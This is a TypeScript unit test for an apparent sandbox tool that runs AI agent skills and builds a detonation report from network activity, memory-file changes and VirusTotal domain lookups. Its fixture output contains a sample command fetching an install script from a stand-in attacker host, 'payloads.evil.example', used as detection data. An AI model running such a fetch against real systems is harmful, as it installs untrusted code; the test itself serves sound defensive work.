import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

import type { PromptRunnerResult } from "./prompt-runner.js";
import { buildDetonationReportFromPromptRunner } from "./telemetry.js";

test("buildDetonationReportFromPromptRunner captures telemetry, enriches indicators, and persists artifacts", async () => {
  const artifactsRoot = await mkdtemp(path.join(tmpdir(), "clawguard-telemetry-test-"));

  try {
    const result: PromptRunnerResult = {
      request: {
        requestId: "req-telemetry",
        snapshot: {
          slug: "fixture-skill",
          path: "/tmp/fixture",
          sourceHints: [{ kind: "fixture", detail: "test" }],
          contentHash: "sha256:test",
          fileInventory: ["SKILL.md"],
          detectedAt: new Date(0).toISOString(),
        },
        prompts: ["run sample"],
        timeoutSeconds: 60,
      },
      plan: {
        requestId: "req-telemetry",
        promptCount: 1,
        setupCommandCount: 0,
        steps: [],
      },
      execution: [
        {
          stepId: "prompt-1",
          type: "prompt",
          intent: "execute-workflow",
          executor: "prompt-harness",
          status: "completed",
          value: "Run workflow",
          command: "node",
          args: ["harness.mjs"],
          startedAt: new Date().toISOString(),
          completedAt: new Date().toISOString(),
          result: {
            exitCode: 0,
            stdout: "curl https://payloads.evil.example/install.sh && echo done",
            stderr: "",
          },
        },
      ],
      memoryDiffs: [
        {
          name: "memory",
          baselinePath: "/tmp/baseline/MEMORY.md",
          currentPath: "/tmp/current/MEMORY.md",
          changed: true,
        },
        {
          name: "soul",
          baselinePath: "/tmp/baseline/SOUL.md",
          currentPath: "/tmp/current/SOUL.md",
          changed: false,
        },
        {
          name: "user",
          baselinePath: "/tmp/baseline/USER.md",
          currentPath: "/tmp/current/USER.md",
          changed: false,
        },
      ],
    };

    const built = await buildDetonationReportFromPromptRunner(result, {
      artifactsRoot,
      virustotalClient: {
        async getDomainVerdict(domain) {
          return {
            provider: "virustotal",
            subjectType: "domain",
            subject: domain,
            verdict: "review",
            summary: "flagged",
            observedAt: new Date().toISOString(),
          };
        },
      },
    });

    assert.ok(built.telemetry.some((event) => event.type === "network"));
    assert.ok(built.telemetry.some((event) => event.type === "memory"));
    assert.ok(built.intelligence.some((event) => event.subjectType === "domain"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "report-json"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "detonation-stdout"));
  } finally {
    await rm(artifactsRoot, { recursive: true, force: true });
  }
});
